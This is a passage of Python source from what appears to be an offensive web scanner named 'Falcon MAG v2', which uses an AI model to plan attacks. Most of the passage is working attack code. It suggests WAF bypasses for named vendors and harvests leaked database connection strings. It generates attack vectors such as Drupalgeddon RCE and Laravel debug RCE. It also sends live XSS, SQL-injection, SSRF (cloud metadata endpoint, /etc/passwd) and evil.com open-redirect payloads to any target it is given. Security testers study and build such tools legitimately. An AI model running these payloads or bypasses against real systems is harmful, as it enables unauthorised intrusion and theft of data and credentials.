                       "Use chunked encoding", "Try different User-Agents"],
        "AWS WAF": ["HTML entities", "Mixed case", "SQL comments",
                    "URL encoding with %XX"],
        "Akamai": ["Whitespace injection (tabs/newlines)", "Parameter pollution",
                   "Multiple encoding layers"],
        "Sucuri": ["Case variation", "Comment injection",
                   "Alternative XSS vectors (SVG, MathML)"],
        "Imperva": ["HTTP parameter pollution", "JSON-based payloads",
                    "Charset manipulation (UTF-16, UTF-7)"],
        "F5 BIG-IP": ["Chunked transfer", "Null byte injection", "HTTP/2 framing"],
        "ModSecurity": ["SQL inline comments /*!*/", "Case variation",
                        "Encoding double", "Buffer overflow probes"],
        "Wordfence": ["Skip login endpoints", "Custom REST endpoints",
                      "XML-RPC bypass"],
        "Barracuda": ["URL encoding", "Case variation", "Comment injection"],
    }
    result["bypass_suggestions"] = suggestions.get(waf_name, [
        "Try mixed case payloads", "Try URL encoding",
        "Try double encoding", "Try chunked transfer",
    ])

    log.info("waf_advanced_complete",
             detected=result["detected"],
             waf=result["waf"],
             strictness=result["strictness"],
             candidates=len(candidates),
             probes=result["probes_sent"])
    return result


async def waf_advanced_from_config(pool, config):
    """Wrapper: extract target and store result in config."""
    target = config.get("target", "")
    if not target:
        return None
    result = await test_waf_advanced(pool, target, active_probe=True)
    config["_waf_advanced"] = result
    return result


# END WAF ADVANCED


async def test_db_fingerprint(pool, target):
    """Advanced DB fingerprinting."""
    import re as _re
    result = {
        "target": target,
        "db_hints": [],
        "version_hints": [],
        "connection_strings": [],
        "findings": [],
        "vulnerable": [],
    }
    resp = await pool.send("GET", target)
    if not resp or resp.status == 0:
        result["error"] = "unreachable"
        return result
    body = (resp.text or "")
    body_lower = body.lower()
    DB_PATTERNS = {
        "MySQL": [r"mysql_", r"mysqli", r"sql syntax.*mysql", r"warning.*mysql"],
        "PostgreSQL": [r"postgresql", r"pg_query", r"pg_exec", r"sqlstate\["],
        "MSSQL": [r"microsoft sql server", r"odbc sql server", r"sqlserver"],
        "Oracle": [r"ora-\d{4,5}", r"oracle.*driver"],
        "MongoDB": [r"mongodb", r"mongo error", r"bson"],
        "SQLite": [r"sqlite", r"operationalerror"],
        "Redis": [r"redis", r"err_client"],
    }
    for db, patterns in DB_PATTERNS.items():
        for p in patterns:
            if _re.search(p, body_lower):
                result["db_hints"].append(db)
                break
    VERSION_PATTERNS = [
        (r"mysql (\d+\.\d+\.\d+)", "MySQL"),
        (r"postgresql (\d+\.\d+)", "PostgreSQL"),
        (r"microsoft sql server (\d+)", "MSSQL"),
        (r"mongodb (\d+\.\d+)", "MongoDB"),
    ]
    for pat, db in VERSION_PATTERNS:
        m = _re.search(pat, body_lower)
        if m:
            result["version_hints"].append({"db": db, "version": m.group(1)})
    CONN_PATTERNS = [
        r"mysql://[^\s\"\x27<>]+",
        r"postgres(?:ql)?://[^\s\"\x27<>]+",
        r"mongodb(?:\+srv)?://[^\s\"\x27<>]+",
        r"redis://[^\s\"\x27<>]+",
        r"jdbc:[a-z]+://[^\s\"\x27<>]+",
    ]
    for pat in CONN_PATTERNS:
        matches = _re.findall(pat, body, _re.IGNORECASE)
        for m in matches[:3]:
            if m not in result["connection_strings"]:
                result["connection_strings"].append(m[:200])
    for conn in result["connection_strings"][:3]:
        result["findings"].append({
            "vuln_class": "db_fingerprint",
            "subtype": "connection_string_leak",
            "severity": "critical",
            "url": target,
            "param": "",
            "payload": conn[:100],
            "evidence": "DB connection string exposed",
            "confidence": 0.85,
        })
    result["vulnerable"] = result["findings"]
    log.info("db_fingerprint_complete",
             db_hints=len(result["db_hints"]),
             conn_strings=len(result["connection_strings"]))
    return result


async def attack_suggestions_from_fingerprint(pool, config):
    """Generate attack suggestions."""
    target = config.get("target", "")
    fp = config.get("_fingerprint_advanced", {}) or {}
    waf_adv = config.get("_waf_advanced", {}) or {}
    suggestions = {"target": target, "paths": [], "vectors": [], "notes": []}
    cms = (fp.get("cms") or "").lower()
    fw = (fp.get("framework") or "").lower()
    lang = (fp.get("language") or "").lower()
    server = (fp.get("server") or "").lower()
    waf = (waf_adv.get("waf") or "").lower()
    if "wordpress" in cms:
        suggestions["paths"].extend(["/wp-admin", "/wp-login.php", "/xmlrpc.php",
                                     "/wp-json/wp/v2/users", "/?author=1"])
        suggestions["vectors"].append("WordPress plugin CVEs")
        suggestions["vectors"].append("XML-RPC brute force")
        suggestions["notes"].append("Check user enumeration via ?author=1")
    elif "joomla" in cms:
        suggestions["paths"].extend(["/administrator", "/components/com_users",
                                     "/configuration.php~"])
        suggestions["vectors"].append("Joomla component SQLi")
    elif "drupal" in cms:
        suggestions["paths"].extend(["/user/login", "/admin", "/CHANGELOG.txt"])
        suggestions["vectors"].append("Drupalgeddon RCE")
    if "next.js" in fw or "nextjs" in fw:
        suggestions["paths"].extend(["/_next/data", "/api/", "/_next/static/"])
        suggestions["vectors"].append("Next.js middleware bypass")
        suggestions["vectors"].append("RSC data leakage")
    elif "laravel" in fw:
        suggestions["paths"].extend(["/.env", "/telescope", "/_ignition/health-check"])
        suggestions["vectors"].append("Laravel debug mode RCE")
    elif "django" in fw:
        suggestions["paths"].extend(["/admin/", "/api/", "/static/admin/"])
        suggestions["vectors"].append("Django debug page leak")
    if "php" in lang:
        suggestions["paths"].extend(["/phpinfo.php", "/info.php"])
    elif "asp.net" in lang:
        suggestions["paths"].extend(["/web.config", "/trace.axd", "/elmah.axd"])
    elif "python" in lang:
        suggestions["paths"].extend(["/__debug__", "/.git/HEAD"])
    if "nginx" in server:
        suggestions["paths"].extend(["/nginx_status", "/status"])
    elif "apache" in server:
        suggestions["paths"].extend(["/server-status", "/server-info"])
    elif "iis" in server:
        suggestions["paths"].extend(["/iisstart.htm", "/web.config"])
    if "cloudflare" in waf:
        suggestions["notes"].append("Cloudflare detected: try direct origin IP")
        suggestions["notes"].append("Use HTTP/2 or chunked transfer to bypass")
    elif "aws waf" in waf:
        suggestions["notes"].append("AWS WAF: try URL/HTML encoding layers")
    elif "imperva" in waf:
        suggestions["notes"].append("Imperva: try charset manipulation")
    suggestions["paths"] = list(dict.fromkeys(suggestions["paths"]))
    suggestions["vectors"] = list(dict.fromkeys(suggestions["vectors"]))
    suggestions["notes"] = list(dict.fromkeys(suggestions["notes"]))
    log.info("attack_suggestions_complete",
             paths=len(suggestions["paths"]),
             vectors=len(suggestions["vectors"]))
    return suggestions


async def detect_waf(pool, url):
    resp = await pool.send("GET", url + "/?test=<script>alert(1)</script>")
    if resp.status in (403, 406, 419, 429, 503):
        return "WAF_BLOCK"
    server = resp.headers.get("server", "").lower()
    for waf in ("cloudflare", "akamai", "sucuri", "incapsula", "imperva", "f5", "barracuda"):
        if waf in server:
            return waf.title()
    return None


async def fingerprint(pool, url):
    resp = await pool.send("GET", url)
    fp = {"status": resp.status, "server": resp.headers.get("server", ""), "powered_by": resp.headers.get("x-powered-by", ""), "cms": [], "framework": [], "js_lib": [], "security_headers": {}, "missing_headers": []}
    body = resp.text.lower()
    for cms in ("wordpress", "joomla", "drupal", "magento"):
        if cms in body:
            fp["cms"].append(cms)
    for fw in ("laravel", "django", "rails", "flask", "spring", "express"):
        if fw in body:
            fp["framework"].append(fw)
    for lib in ("jquery", "react", "angular", "vue", "bootstrap"):
        if lib in body:
            fp["js_lib"].append(lib)
    security = ["content-security-policy", "x-frame-options", "x-content-type-options", "strict-transport-security", "x-xss-protection"]
    for h in security:
        if h in resp.headers:
            fp["security_headers"][h] = resp.headers[h]
        else:
            fp["missing_headers"].append(h)
    return fp


async def crawl(pool, seed_url, max_pages=30, max_depth=2):
    import re
    from urllib.parse import urljoin
    visited = set()
    queue = [(seed_url, 0)]
    endpoints = []
    forms = []
    js_files = []
    parsed_seed = urlparse(seed_url)
    base = f"{parsed_seed.scheme}://{parsed_seed.netloc}"
    while queue and len(visited) < max_pages:
        url, depth = queue.pop(0)
        if url in visited or depth > max_depth:
            continue
        if not pool.scope.is_allowed(url):
            continue
        visited.add(url)
        resp = await pool.send("GET", url)
        if resp.status == 0:
            continue
        body = resp.text
        hrefs = re.findall(r"href=[\x27\x22]([^\x27\x22]+)[\x27\x22]", body)
        for h in hrefs:
            full = urljoin(url, h)
            if full.startswith(base) and full not in visited:
                if full not in [q[0] for q in queue]:
                    queue.append((full, depth + 1))
        forms_found = re.findall(r"<form[^>]*action=[\x27\x22]([^\x27\x22]*)[\x27\x22]", body, re.IGNORECASE)
        for f in forms_found:
            forms.append({"page": url, "action": urljoin(url, f)})
        scripts = re.findall(r"src=[\x27\x22]([^\x27\x22]+\.js[^\x27\x22]*)[\x27\x22]", body)
        for s in scripts:
            js_files.append(urljoin(url, s))
        params = re.findall(r"href=[\x27\x22]([^\x27\x22]*\?[^\x27\x22]+)[\x27\x22]", body)
        for p in params:
            endpoints.append(urljoin(url, p))
    return {"pages_visited": len(visited), "endpoints": list(set(endpoints))[:50], "forms": forms[:20], "js_files": list(set(js_files))[:30], "all_urls": list(visited)}


def render_report(findings, summary, output_dir="reports"):
    """Generate a comprehensive Markdown report including AI plan, hidden paths, findings."""
    import os as _os
    from datetime import datetime as _dt

    _os.makedirs(output_dir, exist_ok=True)
    path = _os.path.join(output_dir, "falcon_report.md")

    target = summary.get("target", "N/A")
    scan_id = summary.get("scan_id", "N/A")
    elapsed = summary.get("elapsed_seconds", 0)
    requests_used = summary.get("budget_used", 0)
    ai_calls = summary.get("ai_calls", 0)
    ai_tokens = summary.get("ai_tokens", 0)
    waf = summary.get("waf")
    waf_info = summary.get("waf_info") or {}
    ai_plan = summary.get("ai_plan") or {}
    hidden_paths = summary.get("hidden_paths") or []
    fingerprint = summary.get("fingerprint") or {}
    crawl = summary.get("crawl") or {}

    lines = []

    # ============================================================
    # HEADER
    # ============================================================
    lines.append("# ðŸ¦… Falcon MAG â€” Full Scan Report")
    lines.append("")
    lines.append(f"**Scan ID:** #{scan_id}")
    lines.append(f"**Target:** `{target}`")
    lines.append(f"**Generated:** {_dt.now().isoformat()}")
    lines.append(f"**Duration:** {elapsed}s")
    lines.append(f"**Requests Used:** {requests_used}")
    lines.append(f"**AI Calls:** {ai_calls} ({ai_tokens} tokens)")
    lines.append("")
    lines.append("---")
    lines.append("")

    # ============================================================
    # EXECUTIVE SUMMARY
    # ============================================================
    lines.append("## ðŸ“‹ Executive Summary")
    lines.append("")

    sev_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for f in findings:
        sev = (f.get("severity") or "info").lower()
        if sev in sev_counts:
            sev_counts[sev] += 1

    lines.append(f"| Metric | Value |")
    lines.append(f"|--------|-------|")
    lines.append(f"| Total Findings | **{len(findings)}** |")
    lines.append(f"| Critical | ðŸ”´ {sev_counts['critical']} |")
    lines.append(f"| High | ðŸŸ  {sev_counts['high']} |")
    lines.append(f"| Medium | ðŸŸ¡ {sev_counts['medium']} |")
    lines.append(f"| Low | ðŸŸ¢ {sev_counts['low']} |")
    lines.append(f"| Info | ðŸ”µ {sev_counts['info']} |")
    lines.append(f"| Hidden Paths Found | {len(hidden_paths)} |")
    lines.append(f"| WAF Detected | {'Yes â€” ' + waf if waf else 'No'} |")
    lines.append("")

    # ============================================================
    # AI ANALYSIS
    # ============================================================
    if ai_plan:
        lines.append("---")
        lines.append("")
        lines.append("## ðŸ§  AI Analysis (DeepSeek)")
        lines.append("")

        risk_level = ai_plan.get("risk_level")
        if risk_level:
            lines.append(f"**Risk Level:** `{risk_level}`")
            lines.append("")

        top_vectors = ai_plan.get("top_attack_vectors") or []
        if top_vectors:
            lines.append("### Top Attack Vectors")
            lines.append("")
            if isinstance(top_vectors, list):
                for v in top_vectors[:10]:
                    lines.append(f"- {v}")
            else:
                lines.append(str(top_vectors))
            lines.append("")

        initial_plan = ai_plan.get("initial_plan")
        if initial_plan:
            lines.append("### Initial Plan")
            lines.append("")
            lines.append(str(initial_plan)[:3000])
            lines.append("")

        test_priorities = ai_plan.get("test_priorities") or []
        if test_priorities:
            lines.append("### Test Priorities")
            lines.append("")
            if isinstance(test_priorities, list):
                for p in test_priorities[:15]:
                    lines.append(f"- {p}")
            else:
                lines.append(str(test_priorities))
            lines.append("")

        exploitation_chain = ai_plan.get("exploitation_chain") or []
        if exploitation_chain:
            lines.append("### Exploitation Chain")
            lines.append("")
            if isinstance(exploitation_chain, list):
                for step in exploitation_chain[:20]:
                    lines.append(f"- {step}")
            else:
                lines.append(str(exploitation_chain))
            lines.append("")

        execution_steps = ai_plan.get("execution_steps") or []
        if execution_steps:
            lines.append("### Execution Steps")
            lines.append("")
            if isinstance(execution_steps, list):
                for i, s in enumerate(execution_steps[:30], 1):
                    lines.append(f"{i}. {s}")
            else:
                lines.append(str(execution_steps))
            lines.append("")

        success_criteria = ai_plan.get("success_criteria") or []
        if success_criteria:
            lines.append("### Success Criteria")
            lines.append("")
            if isinstance(success_criteria, list):
                for s in success_criteria[:15]:
                    lines.append(f"- {s}")
            lines.append("")

        estimated_time = ai_plan.get("estimated_time")
        if estimated_time:
            lines.append(f"**Estimated Time:** {estimated_time}")
            lines.append("")

    # ============================================================
    # HIDDEN PATHS
    # ============================================================
    if hidden_paths:
        lines.append("---")
        lines.append("")
        lines.append(f"## ðŸ—ºï¸ Hidden Paths Discovered ({len(hidden_paths)})")
        lines.append("")
        lines.append("| Path | Status | Size | Type |")
        lines.append("|------|--------|------|------|")
        for p in hidden_paths[:60]:
            path_str = p.get("path", "")
            status = p.get("status", "")
            size = p.get("size", 0)
            ptype = p.get("type", "")
            lines.append(f"| `{path_str}` | {status} | {size}b | {ptype} |")
        if len(hidden_paths) > 60:
            lines.append(f"| ... | ... | ... | *{len(hidden_paths) - 60} more* |")
        lines.append("")

    # ============================================================
    # FINGERPRINT
    # ============================================================
    if fingerprint:
        lines.append("---")
        lines.append("")
        lines.append("## ðŸ” Fingerprint")
        lines.append("")
        lines.append(f"- **Server:** `{fingerprint.get('server', 'N/A')}`")
        lines.append(f"- **Powered By:** `{fingerprint.get('powered_by', 'N/A')}`")
        cms = fingerprint.get("cms", [])
        if cms:
            lines.append(f"- **CMS:** {', '.join(cms)}")
        lines.append("")

    # ============================================================
    # WAF INFO
    # ============================================================
    if waf:
        lines.append("---")
        lines.append("")
        lines.append(f"## ðŸ›¡ï¸ WAF Detected: {waf}")
        lines.append("")
        if waf_info.get("triggered_probes") is not None:
            lines.append(f"- **Probes Triggered:** {waf_info.get('triggered_probes')}/{waf_info.get('probes_sent', '?')}")
        signals = waf_info.get("signals") or []
        if signals:
            lines.append(f"- **Signals Detected:** {len(signals)}")
        lines.append("")

    # ============================================================
    # FINDINGS (DETAILED)
    # ============================================================
    lines.append("---")
    lines.append("")
    lines.append(f"## ðŸ”´ Findings ({len(findings)})")
    lines.append("")

    if not findings:
        lines.append("_No vulnerabilities detected._")
        lines.append("")
    else:
        for i, f in enumerate(findings, 1):
            sev = (f.get("severity") or "info").upper()
            vc = f.get("vuln_class") or "unknown"
            subtype = f.get("subtype") or ""
            title = f"{vc}" + (f" ({subtype})" if subtype else "")

            lines.append(f"### {i}. [{sev}] {title}")
            lines.append("")
            lines.append(f"- **URL:** `{f.get('url', '')}`")
            lines.append(f"- **Parameter:** `{f.get('param', '')}`")
            payload = f.get("payload", "")
            if payload:
                lines.append(f"- **Payload:** `{payload}`")
            conf = f.get("confidence")
            if conf is not None:
                lines.append(f"- **Confidence:** {conf}")
            lines.append("")

            evidence = f.get("evidence", "")
            if evidence:
                lines.append("**Evidence:**")
                lines.append("```")
                lines.append(str(evidence)[:1500])
                lines.append("```")
                lines.append("")

            if f.get("description"):
                lines.append(f"**Description:** {f.get('description')}")
                lines.append("")

            lines.append("")

    # ============================================================
    # SITE MAP (Fingerprint Advanced) - Stage 2.B5
    fp_adv = summary.get("_fingerprint_advanced") or {}
    if fp_adv and fp_adv.get("technologies"):
        lines.append("---")
        lines.append("")
        lines.append("## SITE MAP (Fingerprint Advanced)")
        lines.append("")
        lines.append(f"- **Server:** `{fp_adv.get('server', 'N/A')}`")
        lines.append(f"- **Powered-By:** `{fp_adv.get('powered_by', 'N/A')}`")
        lines.append(f"- **Language:** `{fp_adv.get('language', 'N/A')}`")
        lines.append(f"- **Framework:** `{fp_adv.get('framework', 'N/A')}`")
        lines.append(f"- **CMS:** `{fp_adv.get('cms', 'N/A')}`")
        lines.append(f"- **WAF:** `{fp_adv.get('waf') or 'None'}`")
        techs = fp_adv.get("technologies", [])
        if techs:
            lines.append(f"- **Technologies ({len(techs)}):** {', '.join(techs)}")
        js_libs = fp_adv.get("js_libs", [])
        if js_libs:
            lines.append(f"- **JS Libraries:** {', '.join(js_libs)}")
        db_hints = fp_adv.get("db_hints", [])
        if db_hints:
            lines.append(f"- **DB Hints:** {', '.join(db_hints)}")
        cookies = fp_adv.get("cookies", [])
        if cookies:
            lines.append(f"- **Cookies ({len(cookies)}):** {', '.join(c['name'] for c in cookies[:5])}")
        missing = fp_adv.get("missing_headers", [])
        if missing:
            lines.append(f"- **Missing Security Headers:** {len(missing)}")
        lines.append("")
    # END SITE MAP

    # WAF DETAILS (Stage 2.D v2)
    waf_adv = summary.get("_waf_advanced") or {}
    if waf_adv and waf_adv.get("detected"):
        lines.append("---")
        lines.append("")
        lines.append("## WAF DETECTED")
        lines.append("")
        lines.append("- **WAF:** `" + str(waf_adv.get("waf", "Unknown")) + "`")
        lines.append("- **Strictness:** `" + str(waf_adv.get("strictness", "N/A")) + "`")
        signals = waf_adv.get("signals", [])
        if signals:
            lines.append("- **Signals (" + str(len(signals)) + "):** " + ", ".join(signals[:5]))
        bs = waf_adv.get("bypass_suggestions", [])
        if bs:
            lines.append("")
            lines.append("### Bypass Suggestions")
            for s in bs[:10]:
                lines.append("- " + str(s))
        lines.append("")
    # END WAF DETAILS

    # DB FINGERPRINT (Stage 2.D v2)
    db_fp = summary.get("_db_fingerprint") or {}
    if db_fp and db_fp.get("db_hints"):
        lines.append("---")
        lines.append("")
        lines.append("## DB FINGERPRINT")
        lines.append("")
        lines.append("- **DB Hints:** " + ", ".join(db_fp.get("db_hints", [])))
        vh = db_fp.get("version_hints") or []
        if vh:
            lines.append("- **Version Hints:**")
            for v in vh[:5]:
                lines.append("  - " + str(v.get("db")) + ": " + str(v.get("version")))
        cs = db_fp.get("connection_strings") or []
        if cs:
            lines.append("- **Connection Strings Leaked:** " + str(len(cs)))
        lines.append("")
    # END DB FINGERPRINT

    # ATTACK SUGGESTIONS (Stage 2.D v2)
    suggestions = summary.get("_attack_suggestions") or {}
    if suggestions and (suggestions.get("paths") or suggestions.get("vectors")):
        lines.append("---")
        lines.append("")
        lines.append("## ATTACK SUGGESTIONS")
        lines.append("")
        if suggestions.get("paths"):
            lines.append("### Suggested Paths")
            for p in suggestions["paths"][:20]:
                lines.append("- `" + str(p) + "`")
            lines.append("")
        if suggestions.get("vectors"):
            lines.append("### Suggested Vectors")
            for v in suggestions["vectors"][:10]:
                lines.append("- " + str(v))
            lines.append("")
        if suggestions.get("notes"):
            lines.append("### Notes")
            for n in suggestions["notes"][:10]:
                lines.append("- " + str(n))
            lines.append("")
    # END ATTACK SUGGESTIONS

    # CRAWL SUMMARY
    # ============================================================
    if crawl:
        lines.append("---")
        lines.append("")
        lines.append("## ðŸ•·ï¸ Crawl Summary")
        lines.append("")
        lines.append(f"- **Pages Visited:** {crawl.get('pages_visited', 0)}")
        lines.append(f"- **Endpoints Found:** {len(crawl.get('endpoints', []))}")
        lines.append(f"- **Forms Found:** {len(crawl.get('forms', []))}")
        lines.append(f"- **JS Files:** {len(crawl.get('js_files', []))}")
        lines.append("")

    # ============================================================
    # FOOTER
    # ============================================================
    lines.append("---")
    lines.append("")
    lines.append(f"*Generated by Falcon MAG v2 â€” {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}*")

    content = "\n".join(lines)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(content)
    return path


# ============================================================
# Stage 3: Vulnerability Detection Engines
# ============================================================

async def test_xss(pool, endpoint, params, payloads=None):
    """Test for reflected XSS (uses framework helpers)."""
    from framework_bridge import (
        XSS_PAYLOADS, xss_verify_reflection, xss_find_context, xss_inject_param,
    )

    if payloads is None:
        payloads = XSS_PAYLOADS

    findings = []
    for param in params:
        for payload in payloads:
            test_url = xss_inject_param(endpoint, param, payload)
            resp = await pool.send("GET", test_url)
            if resp.status == 0:
                continue

            body = resp.text or ""
            if not xss_verify_reflection(body, payload):
                continue

            ctx = xss_find_context(body, payload) or {}

            findings.append({
                "vuln_class": "xss",
                "subtype": "reflected",
                "severity": "high",
                "url": endpoint,
                "injected_url": test_url,
                "param": param,
                "payload": payload,
                "context_type": ctx.get("type", "html"),
                "context_before": ctx.get("before", ""),
                "context_after": ctx.get("after", ""),
                "evidence": body[:500],
                "confidence": 0.9,
            })
            log.info("xss_found", endpoint=endpoint, param=param,
                     payload=payload[:50])
            break  # اكفِ بهذا param
    return findings


# === POST XSS SUPPORT (Stage 2.B1) ===
async def test_xss_post(pool, endpoint, params, post_data="", post_json="",
                        method="POST", content_type=None):
    """Test for reflected XSS in POST body (form-encoded or JSON)."""
    from framework_bridge import (
        XSS_PAYLOADS, xss_verify_reflection, xss_find_context,
    )
    from urllib.parse import urlencode, parse_qs
    import json as _json

    findings = []
    if not params:
        return findings

    payloads = XSS_PAYLOADS

    for param in params:
        for payload in payloads:
            try:
                if post_json:
                    body_obj = _json.loads(post_json)
                    if not isinstance(body_obj, dict):
                        body_obj = {}
                    body_obj[param] = payload
                    kwargs = {"json": body_obj}
                    effective_ct = "application/json"
                elif post_data:
                    parsed = parse_qs(post_data, keep_blank_values=True)
                    parsed[param] = [payload]
                    new_body = urlencode(parsed, doseq=True)
                    kwargs = {"content": new_body}
                    effective_ct = content_type or "application/x-www-form-urlencoded"
                else:
                    kwargs = {"data": {param: payload}}
                    effective_ct = "application/x-www-form-urlencoded"

                headers = kwargs.pop("headers", {})
                headers["Content-Type"] = effective_ct
                kwargs["headers"] = headers

                resp = await pool.send(method, endpoint, **kwargs)
                if resp.status == 0:
                    continue

                body = resp.text or ""
                if not xss_verify_reflection(body, payload):
                    continue

                ctx = xss_find_context(body, payload) or {}

                findings.append({
                    "vuln_class": "xss",
                    "subtype": "reflected_post",
                    "severity": "high",
                    "url": endpoint,
                    "injected_url": endpoint,
                    "param": param,
                    "payload": payload,
                    "method": method,
                    "content_type": effective_ct,
                    "context_type": ctx.get("type", "html"),
                    "context_before": ctx.get("before", ""),
                    "context_after": ctx.get("after", ""),
                    "evidence": body[:500],
                    "confidence": 0.9,
                })
                log.info("xss_post_found", endpoint=endpoint, param=param,
                         method=method, payload=payload[:50])
                break
            except Exception as _e:
                log.debug("xss_post_failed", param=param, error=str(_e))
                continue
    return findings


async def test_xss_post_from_config(pool, config):
    """Wrapper: extract POST forms from config and run test_xss_post."""
    findings = []
    forms = config.get("_crawl_forms_post", []) or []
    if not forms:
        return findings

    for form in forms[:5]:
        action = form.get("action", "")
        body = form.get("body", "")
        fields = form.get("fields", []) or []
        if not action or not fields:
            continue

        post_json = ""
        post_data = ""
        if body.strip().startswith("{"):
            post_json = body
        else:
            post_data = body

        sub = await test_xss_post(
            pool, action, fields,
            post_data=post_data,
            post_json=post_json,
            method="POST",
        )
        findings.extend(sub)
    return findings

# === END POST XSS SUPPORT ===

async def test_sqli_post(pool, endpoint, params, post_data="", post_json=""):
    """Test SQL injection in POST body."""
    from framework_bridge import (
        SQLI_ERROR_PAYLOADS, sqli_has_db_error, sqli_looks_like_error,
    )
    from urllib.parse import urlencode, parse_qs
    import json as _json
    findings = []
    if not params:
        return findings
    for param in params:
        for payload in SQLI_ERROR_PAYLOADS:
            try:
                if post_json:
                    body_obj = _json.loads(post_json)
                    if not isinstance(body_obj, dict):
                        body_obj = {}
                    body_obj[param] = payload
                    resp = await pool.send("POST", endpoint, json=body_obj,
                        headers={"Content-Type": "application/json"})
                elif post_data:
                    parsed = parse_qs(post_data, keep_blank_values=True)
                    parsed[param] = [payload]
                    new_body = urlencode(parsed, doseq=True)
                    resp = await pool.send("POST", endpoint, content=new_body,
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
                else:
                    resp = await pool.send("POST", endpoint,
                        data={param: payload})
            except Exception as _e:
                log.debug("sqli_post_failed", param=param, error=str(_e))
                continue
            if not resp or resp.status == 0:
                continue
            body = resp.text or ""
            sig = sqli_has_db_error(body)
            if not sig and resp.status == 500 and sqli_looks_like_error(body):
                sig = "HTTP 500"
            if sig:
                findings.append({
                    "vuln_class": "sqli",
                    "subtype": "post_error_based",
                    "severity": "critical",
                    "url": endpoint,
                    "injected_url": endpoint,
                    "param": param,
                    "payload": payload,
                    "method": "POST",
                    "db_error": sig,
                    "evidence": body[:500],
                    "confidence": 0.9,
                })
                log.info("sqli_post_found", endpoint=endpoint, param=param)
                break
    return findings


async def test_ssrf_post(pool, endpoint, params, post_data="", post_json=""):
    """Test SSRF in POST body."""
    from urllib.parse import urlencode, parse_qs
    import json as _json
    findings = []
    if not params:
        return findings
    ssrf_payloads = [
        "http://127.0.0.1:80",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
    ]
    for param in params:
        for payload in ssrf_payloads:
            try:
                if post_json:
                    body_obj = _json.loads(post_json)
                    if not isinstance(body_obj, dict):
                        body_obj = {}
                    body_obj[param] = payload
                    resp = await pool.send("POST", endpoint, json=body_obj,
                        headers={"Content-Type": "application/json"})
                elif post_data:
                    parsed = parse_qs(post_data, keep_blank_values=True)
                    parsed[param] = [payload]
                    new_body = urlencode(parsed, doseq=True)
                    resp = await pool.send("POST", endpoint, content=new_body,
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
                else:
                    resp = await pool.send("POST", endpoint,
                        data={param: payload})
            except Exception as _e:
                log.debug("ssrf_post_failed", param=param, error=str(_e))
                continue
            if not resp or resp.status == 0:
                continue
            body_low = (resp.text or "").lower()
            if any(m in body_low for m in ["aws", "metadata", "root:", "instance-id"]):
                findings.append({
                    "vuln_class": "ssrf",
                    "subtype": "post_ssrf",
                    "severity": "critical",
                    "url": endpoint,
                    "injected_url": endpoint,
                    "param": param,
                    "payload": payload,
                    "method": "POST",
                    "evidence": (resp.text or "")[:500],
                    "confidence": 0.85,
                })
                log.info("ssrf_post_found", endpoint=endpoint, param=param)
                break
    return findings


async def test_open_redirect_post(pool, endpoint, params, post_data="", post_json=""):
    """Test open redirect in POST body."""
    from urllib.parse import urlencode, parse_qs
    import json as _json
    findings = []
    if not params:
        return findings
    redirect_payloads = [
        "https://evil.com",
        "//evil.com",
        "https://google.com",
    ]
    for param in params:
        for payload in redirect_payloads:
            try:
                if post_json:
                    body_obj = _json.loads(post_json)
                    if not isinstance(body_obj, dict):
                        body_obj = {}
                    body_obj[param] = payload
                    resp = await pool.send("POST", endpoint, json=body_obj,
                        headers={"Content-Type": "application/json"})
                elif post_data:
                    parsed = parse_qs(post_data, keep_blank_values=True)
                    parsed[param] = [payload]
                    new_body = urlencode(parsed, doseq=True)
                    resp = await pool.send("POST", endpoint, content=new_body,
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
                else:
                    resp = await pool.send("POST", endpoint,
                        data={param: payload})
            except Exception as _e:
                log.debug("redirect_post_failed", param=param, error=str(_e))
                continue
            if not resp or resp.status == 0:
                continue
            if resp.status in (301, 302, 303, 307, 308):
                location = (resp.headers or {}).get("location", "")
                if "evil.com" in location or "google.com" in location:
                    findings.append({
                        "vuln_class": "open_redirect",
                        "subtype": "post_redirect",
                        "severity": "medium",
                        "url": endpoint,
                        "injected_url": endpoint,
                        "param": param,
                        "payload": payload,
                        "method": "POST",
                        "evidence": "Redirects to: " + location,
                        "confidence": 0.9,
                    })
                    log.info("redirect_post_found", endpoint=endpoint, param=param)
                    break
    return findings


async def test_sqli(pool, endpoint, params):
    """Test for SQL injection (error-based + time-based)."""
    error_payloads = [
        "'",
        "\"",
        "')",
        "' OR '1'='1",
        "1' AND '1'='2",
        "admin'--",
    ]
    time_payloads = [
        "' OR SLEEP(3)--",
        "'; WAITFOR DELAY '0:0:3'--",
    ]
    sql_errors = [
        "sql syntax", "mysql_fetch", "ora-01756", "unclosed quotation",
        "sqlite3.operationalerror", "postgresql", "you have an error in your sql",
        "warning: mysql", "valid mysql result",
    ]
    findings = []
    for param in params:
        # Error-based
        for payload in error_payloads:
            test_url = f"{endpoint}?{param}={payload}"
            resp = await pool.send("GET", test_url)
            if resp.status == 0:
                continue
            body_lower = resp.text.lower()
            for err in sql_errors:
                if err in body_lower:
                    findings.append({
                        "vuln_class": "sqli",
                        "subtype": "error-based",
                        "severity": "critical",
                        "url": endpoint,
                        "param": param,
                        "payload": payload,
                        "evidence": resp.text[:500],
                        "confidence": 0.9,
                    })
                    log.info("sqli_found", endpoint=endpoint, param=param, subtype="error-based")
                    break
        # Time-based
        for payload in time_payloads:
            test_url = f"{endpoint}?{param}={payload}"
            import time as _t
            start = _t.monotonic()
            resp = await pool.send("GET", test_url)
            elapsed = _t.monotonic() - start
            if elapsed > 2.5 and resp.status != 0:
                findings.append({
                    "vuln_class": "sqli",
                    "subtype": "time-based",
                    "severity": "critical",
                    "url": endpoint,
                    "param": param,
                    "payload": payload,
                    "evidence": f"Response delayed by {elapsed:.1f}s",
                    "confidence": 0.75,
                })
                log.info("sqli_found", endpoint=endpoint, param=param, subtype="time-based")
                break
    return findings


async def test_open_redirect(pool, endpoint, params):
    """Test for open redirect."""
    redirect_payloads = [
        "https://evil.com",
        "//evil.com",
        "https://google.com",
    ]
    findings = []
    for param in params:
        for payload in redirect_payloads:
            test_url = f"{endpoint}?{param}={payload}"
            resp = await pool.send("GET", test_url)
            if resp.status in (301, 302, 303, 307, 308):
                location = resp.headers.get("location", "")
                if "evil.com" in location or "google.com" in location:
                    findings.append({
                        "vuln_class": "open_redirect",
